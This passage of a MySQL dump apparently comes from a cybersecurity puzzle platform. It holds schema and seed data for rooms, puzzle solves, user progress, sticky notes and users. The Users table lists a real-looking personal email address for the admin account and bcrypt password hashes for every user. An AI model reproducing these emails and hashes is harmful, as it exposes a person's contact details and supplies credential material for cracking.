  `name` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `description` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `category` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `icon_emoji` varchar(10) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT 0xF09F9492,
  `icon_color` varchar(7) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT '#00ff66',
  `member_count` int DEFAULT '0',
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `Rooms`
--

INSERT INTO `Rooms` (`id`, `name`, `description`, `category`, `icon_emoji`, `icon_color`, `member_count`, `created_at`) VALUES
(1, 'Red Team Ops', 'Offensive security, exploitation, and attack techniques', 'red_team', '🔴', '#dc3545', 0, '2025-12-09 11:36:39'),
(2, 'Blue Team Defense', 'Defensive security, incident response, and hardening', 'blue_team', '🔵', '#0d6efd', 0, '2025-12-09 11:36:39'),
(3, 'Cryptography Lab', 'Cipher breaking, encryption analysis, and crypto challenges', 'cryptography', '🔐', '#00ff66', 0, '2025-12-09 11:36:39'),
(4, 'Forensics & OSINT', 'Digital forensics, investigation, and open-source intelligence', 'forensics', '🔍', '#ffc107', 0, '2025-12-09 11:36:39'),
(5, 'Web Hacking', 'Web application vulnerabilities and exploitation', 'web', '🌐', '#17a2b8', 0, '2025-12-09 11:36:39'),
(6, 'Reverse Engineering', 'Binary analysis, malware reverse engineering, and cracking', 'reverse_eng', '⚙️', '#6f42c1', 0, '2025-12-09 11:36:39');

-- --------------------------------------------------------

--
-- Table structure for table `SolvedPuzzles`
--

CREATE TABLE `SolvedPuzzles` (
  `id` int NOT NULL,
  `user_id` int UNSIGNED NOT NULL,
  `puzzle_id` int NOT NULL,
  `solved_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `mode` enum('standard','overclock','burstrush') COLLATE utf8mb4_unicode_ci DEFAULT 'standard',
  `difficulty` varchar(20) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `points_earned` int DEFAULT '0',
  `time_taken_seconds` int DEFAULT NULL,
  `attempts_used` int DEFAULT '1',
  `streak_count` int DEFAULT NULL,
  `questions_correct` int DEFAULT NULL,
  `total_questions_in_session` int DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `SolvedPuzzles`
--

INSERT INTO `SolvedPuzzles` (`id`, `user_id`, `puzzle_id`, `solved_at`, `mode`, `difficulty`, `points_earned`, `time_taken_seconds`, `attempts_used`, `streak_count`, `questions_correct`, `total_questions_in_session`) VALUES
(1, 8, 1, '2025-11-29 11:34:50', 'standard', 'Easy', 100, 45, 1, NULL, NULL, NULL),
(2, 8, 2, '2025-11-30 11:34:50', 'standard', 'Medium', 250, 180, 2, NULL, NULL, NULL),
(3, 8, 10, '2025-12-01 11:34:50', 'standard', 'Medium', 175, 240, 3, NULL, NULL, NULL),
(4, 8, 8, '2025-12-02 11:34:50', 'overclock', 'base', 72, 120, 1, NULL, NULL, NULL),
(5, 8, 11, '2025-12-03 11:34:50', 'overclock', 'turbo', 300, 200, 2, NULL, NULL, NULL),
(6, 8, 12, '2025-12-04 11:34:50', 'overclock', 'hyper', 700, 150, 1, NULL, NULL, NULL),
(7, 8, 23, '2025-12-05 11:34:50', 'standard', 'Easy', 55, 60, 1, NULL, NULL, NULL),
(8, 8, 24, '2025-12-06 11:34:50', 'standard', 'Easy', 75, 90, 1, NULL, NULL, NULL),
(9, 8, 16, '2025-12-07 11:34:50', 'overclock', 'thermal', 875, 80, 1, NULL, NULL, NULL),
(10, 8, 27, '2025-12-08 11:34:50', 'standard', 'Hard', 320, 420, 2, NULL, NULL, NULL),
(11, 8, 3, '2025-12-09 11:34:50', 'burstrush', NULL, 150, 180, 1, NULL, NULL, NULL),
(12, 8, 4, '2025-12-09 11:34:50', 'standard', 'Easy', 75, 50, 1, NULL, NULL, NULL),
(13, 8, 5, '2025-12-09 11:34:50', 'standard', 'Medium', 150, 200, 1, NULL, NULL, NULL),
(14, 8, 7, '2025-12-09 11:34:50', 'overclock', 'hyper', 600, 180, 2, NULL, NULL, NULL),
(15, 8, 9, '2025-12-09 11:34:50', 'standard', 'Easy', 80, 75, 1, NULL, NULL, NULL),
(16, 9, 1, '2025-11-27 11:34:51', 'standard', 'Easy', 100, 30, 1, NULL, NULL, NULL),
(17, 9, 3, '2025-11-28 11:34:51', 'standard', 'Easy', 50, 40, 1, NULL, NULL, NULL),
(18, 9, 4, '2025-11-29 11:34:51', 'overclock', 'base', 90, 100, 1, NULL, NULL, NULL),
(19, 9, 5, '2025-11-30 11:34:51', 'standard', 'Medium', 150, 150, 1, NULL, NULL, NULL),
(20, 9, 6, '2025-12-01 11:34:51', 'overclock', 'turbo', 187, 160, 1, NULL, NULL, NULL),
(21, 9, 7, '2025-12-02 11:34:51', 'standard', 'Hard', 300, 350, 2, NULL, NULL, NULL),
(22, 9, 13, '2025-12-03 11:34:51', 'standard', 'Easy', 70, 60, 1, NULL, NULL, NULL),
(23, 9, 14, '2025-12-04 11:34:51', 'overclock', 'hyper', 180, 200, 1, NULL, NULL, NULL),
(24, 9, 15, '2025-12-05 11:34:51', 'standard', 'Medium', 180, 300, 2, NULL, NULL, NULL),
(25, 9, 16, '2025-12-06 11:34:51', 'overclock', 'thermal', 400, 180, 1, NULL, NULL, NULL),
(26, 9, 17, '2025-12-07 11:34:51', 'standard', 'Hard', 280, 400, 3, NULL, NULL, NULL),
(27, 9, 2, '2025-12-08 11:34:51', 'standard', 'Medium', 250, 200, 1, NULL, NULL, NULL),
(28, 9, 8, '2025-12-09 11:34:51', 'burstrush', NULL, 200, 240, 1, NULL, NULL, NULL),
(29, 9, 9, '2025-12-09 11:34:51', 'standard', 'Easy', 80, 70, 1, NULL, NULL, NULL),
(30, 9, 10, '2025-12-09 11:34:51', 'standard', 'Medium', 175, 210, 1, NULL, NULL, NULL),
(31, 9, 11, '2025-12-09 11:34:51', 'overclock', 'base', 120, 140, 1, NULL, NULL, NULL),
(32, 9, 18, '2025-12-09 11:34:51', 'standard', 'Easy', 65, 50, 1, NULL, NULL, NULL),
(33, 9, 23, '2025-12-09 11:34:51', 'burstrush', NULL, 180, 220, 1, NULL, NULL, NULL),
(34, 9, 24, '2025-12-09 11:34:51', 'standard', 'Easy', 75, 80, 1, NULL, NULL, NULL),
(35, 9, 25, '2025-12-09 11:34:51', 'standard', 'Medium', 140, 250, 2, NULL, NULL, NULL),
(36, 9, 26, '2025-12-09 11:34:51', 'overclock', 'hyper', 560, 140, 1, NULL, NULL, NULL),
(37, 9, 27, '2025-12-09 11:34:51', 'standard', 'Hard', 320, 380, 2, NULL, NULL, NULL),
(93, 10, 20, '2025-12-01 11:36:39', 'standard', 'Medium', 190, 320, 2, NULL, NULL, NULL),
(94, 10, 21, '2025-12-02 11:36:39', 'standard', 'Medium', 210, 280, 1, NULL, NULL, NULL),
(95, 10, 22, '2025-12-03 11:36:39', 'standard', 'Hard', 400, 500, 3, NULL, NULL, NULL),
(96, 10, 1, '2025-12-04 11:36:39', 'standard', 'Easy', 100, 50, 1, NULL, NULL, NULL),
(97, 10, 2, '2025-12-05 11:36:39', 'overclock', 'base', 300, 200, 1, NULL, NULL, NULL),
(98, 10, 19, '2025-12-06 11:36:39', 'standard', 'Easy', 85, 90, 1, NULL, NULL, NULL),
(99, 10, 18, '2025-12-07 11:36:39', 'overclock', 'turbo', 112, 180, 1, NULL, NULL, NULL),
(100, 10, 8, '2025-12-08 11:36:39', 'standard', 'Easy', 60, 65, 1, NULL, NULL, NULL),
(101, 10, 9, '2025-12-09 11:36:39', 'burstrush', NULL, 160, 200, 1, NULL, NULL, NULL),
(102, 10, 10, '2025-12-09 11:36:39', 'standard', 'Medium', 175, 220, 2, NULL, NULL, NULL),
(103, 10, 3, '2025-12-09 11:36:39', 'standard', 'Easy', 50, 45, 1, NULL, NULL, NULL),
(104, 10, 4, '2025-12-09 11:36:39', 'overclock', 'hyper', 150, 160, 1, NULL, NULL, NULL),
(105, 10, 5, '2025-12-09 11:36:39', 'standard', 'Medium', 150, 180, 1, NULL, NULL, NULL),
(106, 10, 23, '2025-12-09 11:36:39', 'standard', 'Easy', 55, 55, 1, NULL, NULL, NULL),
(107, 10, 24, '2025-12-09 11:36:39', 'overclock', 'base', 90, 120, 1, NULL, NULL, NULL),
(108, 10, 13, '2025-12-09 11:36:39', 'standard', 'Easy', 70, 65, 1, NULL, NULL, NULL),
(109, 10, 14, '2025-12-09 11:36:39', 'standard', 'Easy', 90, 100, 1, NULL, NULL, NULL),
(110, 10, 26, '2025-12-09 11:36:39', 'overclock', 'hyper', 480, 160, 1, NULL, NULL, NULL),
(111, 11, 2, '2025-12-03 11:36:39', 'standard', 'Medium', 250, 200, 2, NULL, NULL, NULL),
(112, 11, 10, '2025-12-04 11:36:39', 'standard', 'Medium', 175, 260, 3, NULL, NULL, NULL),
(113, 11, 11, '2025-12-05 11:36:39', 'overclock', 'base', 150, 200, 2, NULL, NULL, NULL),
(114, 11, 12, '2025-12-06 11:36:39', 'standard', 'Hard', 350, 450, 2, NULL, NULL, NULL),
(115, 11, 1, '2025-12-07 11:36:39', 'standard', 'Easy', 100, 45, 1, NULL, NULL, NULL),
(116, 11, 23, '2025-12-08 11:36:39', 'standard', 'Easy', 55, 60, 1, NULL, NULL, NULL),
(117, 11, 24, '2025-12-09 11:36:39', 'standard', 'Easy', 75, 75, 1, NULL, NULL, NULL),
(118, 11, 8, '2025-12-09 11:36:39', 'standard', 'Easy', 60, 70, 1, NULL, NULL, NULL),
(119, 11, 9, '2025-12-09 11:36:39', 'burstrush', NULL, 140, 180, 1, NULL, NULL, NULL),
(120, 11, 16, '2025-12-09 11:36:39', 'overclock', 'turbo', 375, 220, 1, NULL, NULL, NULL),
(121, 11, 3, '2025-12-09 11:36:39', 'standard', 'Easy', 50, 50, 1, NULL, NULL, NULL),
(122, 11, 4, '2025-12-09 11:36:39', 'standard', 'Easy', 75, 60, 1, NULL, NULL, NULL),
(123, 0, 1, '2025-12-10 11:27:34', 'overclock', 'thermal', 300, NULL, 1, NULL, NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `StickyNotes`
--

CREATE TABLE `StickyNotes` (
  `id` int NOT NULL,
  `room_id` int NOT NULL,
  `user_id` int UNSIGNED NOT NULL,
  `title` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `x_position` int DEFAULT '100',
  `y_position` int DEFAULT '100',
  `color` varchar(7) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT '#ffff00',
  `pinned` tinyint(1) DEFAULT '0',
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `StickyNotes`
--

INSERT INTO `StickyNotes` (`id`, `room_id`, `user_id`, `title`, `content`, `x_position`, `y_position`, `color`, `pinned`, `created_at`, `updated_at`) VALUES
(2, 1, 0, 'Hi', 'Boo', 1884, 895, '1', 0, '2025-12-10 14:53:40', '2025-12-11 21:47:53');

-- --------------------------------------------------------

--
-- Table structure for table `UserProgress`
--

CREATE TABLE `UserProgress` (
  `id` int UNSIGNED NOT NULL,
  `user_id` int UNSIGNED NOT NULL,
  `puzzles_solved` int DEFAULT '0',
  `attempts` int DEFAULT '0',
  `hints_used` int DEFAULT '0',
  `last_attempt` timestamp NULL DEFAULT NULL,
  `total_points` int DEFAULT '0',
  `expertise_tag` varchar(100) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Dumping data for table `UserProgress`
--

INSERT INTO `UserProgress` (`id`, `user_id`, `puzzles_solved`, `attempts`, `hints_used`, `last_attempt`, `total_points`, `expertise_tag`) VALUES
(1, 0, 1, 1, 0, '2025-12-10 11:27:34', 300, NULL),
(2, 7, 0, 0, 0, NULL, 0, NULL),
(3, 8, 15, 21, 5, '2025-12-09 11:34:50', 3977, 'red_team'),
(4, 9, 22, 28, 8, '2025-12-09 11:34:51', 4152, 'cryptography'),
(5, 10, 18, 22, 4, '2025-12-09 11:36:39', 2927, 'blue_team'),
(6, 11, 12, 17, 6, '2025-12-09 11:36:39', 1855, 'red_team'),
(7, 12, 0, 0, 9, NULL, 0, 'steganography'),
(8, 13, 0, 0, 7, NULL, 0, 'forensics'),
(9, 14, 0, 0, 5, NULL, 0, 'osint'),
(10, 15, 0, 0, 10, NULL, 0, 'reverse_engineering'),
(11, 16, 0, 0, 3, NULL, 0, 'red_team'),
(12, 17, 0, 0, 6, NULL, 0, 'web_hacking');

-- --------------------------------------------------------

--
-- Table structure for table `Users`
--

CREATE TABLE `Users` (
  `id` int UNSIGNED NOT NULL,
  `username` varchar(50) NOT NULL,
  `email` varchar(100) NOT NULL,
  `password` varchar(255) NOT NULL,
  `role` varchar(5) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;

--
-- Dumping data for table `Users`
--

INSERT INTO `Users` (`id`, `username`, `email`, `password`, `role`) VALUES
(0, 'Ace', 'abdullawazeerdeen@gmail.com', '$2y$10$1BDkptmE6W3GeaKbIt3Kx.Sah4eh5KJAslvdK/PaMVt0a3TG3v2Pm', 'admin'),
(7, 'guy', 'guy123@gmail.com', '$2y$10$MVSQ5/1sXEgVVNTKdFr1kOuoN1TmGbQkRVqHEptKIPtlFhmCFP2hS', 'user'),
(8, 'shadow_ops', 'shadow@cypherdeck.com', '$2y$10$MVSQ5/1sXEgVVNTKdFr1kOuoN1TmGbQkRVqHEptKIPtlFhmCFP2hS', 'user'),
(9, 'cipher_master', 'cipher@cypherdeck.com', '$2y$10$MVSQ5/1sXEgVVNTKdFr1kOuoN1TmGbQkRVqHEptKIPtlFhmCFP2hS', 'user'),
(10, 'blue_guardian', 'guardian@cypherdeck.com', '$2y$10$MVSQ5/1sXEgVVNTKdFr1kOuoN1TmGbQkRVqHEptKIPtlFhmCFP2hS', 'user'),
(11, 'red_phantom', 'phantom@cypherdeck.com', '$2y$10$MVSQ5/1sXEgVVNTKdFr1kOuoN1TmGbQkRVqHEptKIPtlFhmCFP2hS', 'user'),
(12, 'stego_hunter', 'stego@cypherdeck.com', '$2y$10$MVSQ5/1sXEgVVNTKdFr1kOuoN1TmGbQkRVqHEptKIPtlFhmCFP2hS', 'user'),
(13, 'forensic_pro', 'forensic@cypherdeck.com', '$2y$10$MVSQ5/1sXEgVVNTKdFr1kOuoN1TmGbQkRVqHEptKIPtlFhmCFP2hS', 'user'),
(14, 'osint_ninja', 'ninja@cypherdeck.com', '$2y$10$MVSQ5/1sXEgVVNTKdFr1kOuoN1TmGbQkRVqHEptKIPtlFhmCFP2hS', 'user'),
(15, 'reverse_eng', 'reverse@cypherdeck.com', '$2y$10$MVSQ5/1sXEgVVNTKdFr1kOuoN1TmGbQkRVqHEptKIPtlFhmCFP2hS', 'user'),
(16, 'exploit_dev', 'exploit@cypherdeck.com', '$2y$10$MVSQ5/1sXEgVVNTKdFr1kOuoN1TmGbQkRVqHEptKIPtlFhmCFP2hS', 'user'),
(17, 'network_sniffer', 'sniffer@cypherdeck.com', '$2y$10$MVSQ5/1sXEgVVNTKdFr1kOuoN1TmGbQkRVqHEptKIPtlFhmCFP2hS', 'user');

-- --------------------------------------------------------

--
-- Table structure for table `WindowPositions`
--

CREATE TABLE `WindowPositions` (
  `id` int NOT NULL,
  `room_id` int NOT NULL,
  `user_id` int UNSIGNED NOT NULL,
  `window_type` enum('chat','puzzles','notes') CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `x` int DEFAULT '0',
  `y` int DEFAULT '0',
  `width` int DEFAULT '500',
  `height` int DEFAULT '400',
  `minimized` tinyint(1) DEFAULT '0',
  `updated_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Indexes for dumped tables
--

--
-- Indexes for table `BurstRushSessions`
--
ALTER TABLE `BurstRushSessions`
  ADD PRIMARY KEY (`id`),
  ADD KEY `puzzle_id` (`puzzle_id`),
  ADD KEY `idx_active_sessions` (`user_id`,`status`);

--
-- Indexes for table `ChatMessages`
--
ALTER TABLE `ChatMessages`
  ADD PRIMARY KEY (`id`),
  ADD KEY `room_id` (`room_id`),
  ADD KEY `user_id` (`user_id`),
  ADD KEY `created_at` (`created_at`),
  ADD KEY `idx_room_created` (`room_id`,`created_at`);

--
-- Indexes for table `ContactMessages`
--
ALTER TABLE `ContactMessages`
  ADD PRIMARY KEY (`id`),
  ADD KEY `user_id` (`user_id`),
  ADD KEY `status` (`status`);

--
-- Indexes for table `OverclockScores`
--
ALTER TABLE `OverclockScores`
  ADD PRIMARY KEY (`id`),
  ADD KEY `score_idx` (`difficulty`,`score`),
  ADD KEY `user_scores_idx` (`user_id`,`difficulty`,`score`);

--
-- Indexes for table `PuzzleQuestions`
--
ALTER TABLE `PuzzleQuestions`
  ADD PRIMARY KEY (`id`),
  ADD KEY `puzzleid` (`puzzleid`);

--
-- Indexes for table `PuzzleStore`
--
ALTER TABLE `PuzzleStore`
  ADD PRIMARY KEY (`id`),
  ADD KEY `created_by` (`created_by`);

--
-- Indexes for table `Rooms`
--
ALTER TABLE `Rooms`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `room_name` (`name`),
  ADD KEY `idx_category` (`category`);

--
-- Indexes for table `SolvedPuzzles`
--
ALTER TABLE `SolvedPuzzles`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `unique_standard_solve` (`user_id`,`puzzle_id`,`mode`),
  ADD KEY `idx_user_solved` (`user_id`,`solved_at`),
  ADD KEY `idx_puzzle_solvers` (`puzzle_id`);

--
-- Indexes for table `StickyNotes`
--
ALTER TABLE `StickyNotes`
  ADD PRIMARY KEY (`id`),
  ADD KEY `room_id` (`room_id`),
  ADD KEY `user_id` (`user_id`),
  ADD KEY `idx_room_user` (`room_id`,`user_id`);

--
-- Indexes for table `UserProgress`
--
ALTER TABLE `UserProgress`
  ADD PRIMARY KEY (`id`),
  ADD KEY `user_id` (`user_id`);

--
-- Indexes for table `Users`
--
ALTER TABLE `Users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `username` (`username`),
  ADD UNIQUE KEY `email` (`email`);

--
-- Indexes for table `WindowPositions`
--
ALTER TABLE `WindowPositions`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `unique_window` (`room_id`,`user_id`,`window_type`),
  ADD KEY `user_id` (`user_id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `BurstRushSessions`
--
ALTER TABLE `BurstRushSessions`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `ChatMessages`
--
ALTER TABLE `ChatMessages`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=16;

--
-- AUTO_INCREMENT for table `ContactMessages`
--
ALTER TABLE `ContactMessages`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `OverclockScores`
--
ALTER TABLE `OverclockScores`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `PuzzleQuestions`
--
ALTER TABLE `PuzzleQuestions`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=61;

--
-- AUTO_INCREMENT for table `PuzzleStore`
--
ALTER TABLE `PuzzleStore`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=71;

--
-- AUTO_INCREMENT for table `Rooms`
--
ALTER TABLE `Rooms`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT for table `SolvedPuzzles`
--
ALTER TABLE `SolvedPuzzles`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=124;

--
-- AUTO_INCREMENT for table `StickyNotes`
--
ALTER TABLE `StickyNotes`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `UserProgress`
--
ALTER TABLE `UserProgress`
  MODIFY `id` int UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;

--
-- AUTO_INCREMENT for table `Users`
--
ALTER TABLE `Users`
  MODIFY `id` int UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=18;

--
-- AUTO_INCREMENT for table `WindowPositions`
--
ALTER TABLE `WindowPositions`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;

--
-- Constraints for dumped tables
--

--
-- Constraints for table `BurstRushSessions`
--
ALTER TABLE `BurstRushSessions`
  ADD CONSTRAINT `BurstRushSessions_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `Users` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `BurstRushSessions_ibfk_2` FOREIGN KEY (`puzzle_id`) REFERENCES `PuzzleStore` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `ChatMessages`
--
ALTER TABLE `ChatMessages`
  ADD CONSTRAINT `ChatMessages_ibfk_1` FOREIGN KEY (`room_id`) REFERENCES `Rooms` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `ChatMessages_ibfk_2` FOREIGN KEY (`user_id`) REFERENCES `Users` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `ContactMessages`
--
ALTER TABLE `ContactMessages`
  ADD CONSTRAINT `ContactMessages_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `Users` (`id`) ON DELETE SET NULL;

--
-- Constraints for table `OverclockScores`
--
ALTER TABLE `OverclockScores`
  ADD CONSTRAINT `OverclockScores_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `Users` (`id`);

--
-- Constraints for table `PuzzleQuestions`
--
ALTER TABLE `PuzzleQuestions`
  ADD CONSTRAINT `PuzzleQuestions_ibfk_1` FOREIGN KEY (`puzzleid`) REFERENCES `PuzzleStore` (`id`);

--
-- Constraints for table `PuzzleStore`
--
ALTER TABLE `PuzzleStore`
  ADD CONSTRAINT `PuzzleStore_ibfk_1` FOREIGN KEY (`created_by`) REFERENCES `Users` (`id`);

--
-- Constraints for table `SolvedPuzzles`
--
ALTER TABLE `SolvedPuzzles`
  ADD CONSTRAINT `SolvedPuzzles_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `Users` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `SolvedPuzzles_ibfk_2` FOREIGN KEY (`puzzle_id`) REFERENCES `PuzzleStore` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `StickyNotes`
--
ALTER TABLE `StickyNotes`
  ADD CONSTRAINT `StickyNotes_ibfk_1` FOREIGN KEY (`room_id`) REFERENCES `Rooms` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `StickyNotes_ibfk_2` FOREIGN KEY (`user_id`) REFERENCES `Users` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `UserProgress`
--
ALTER TABLE `UserProgress`
  ADD CONSTRAINT `UserProgress_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `Users` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `WindowPositions`
--
ALTER TABLE `WindowPositions`
  ADD CONSTRAINT `WindowPositions_ibfk_1` FOREIGN KEY (`room_id`) REFERENCES `Rooms` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `WindowPositions_ibfk_2` FOREIGN KEY (`user_id`) REFERENCES `Users` (`id`) ON DELETE CASCADE;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
